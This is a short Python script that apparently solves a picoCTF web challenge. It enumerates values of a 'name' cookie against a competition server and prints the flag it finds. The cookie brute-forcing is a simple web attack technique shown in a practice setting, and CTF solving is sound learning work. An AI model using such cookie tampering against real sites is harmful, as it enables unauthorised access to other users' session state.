import requests

# Replace with the actual URL provided by your picoCTF instance
url = "http://wily-courier.picoctf.net:54170/check" 

for i in range(50): # Checking numbers 0 to 50
    cookies = {'name': str(i)}
    response = requests.get(url, cookies=cookies)
    
    if "picoCTF{" in response.text:
        print(f"Found the flag at cookie index {i}!")
        # Extract and print the flag
        for line in response.text.split('\n'):
            if "picoCTF{" in line:
                print(line.strip())
        break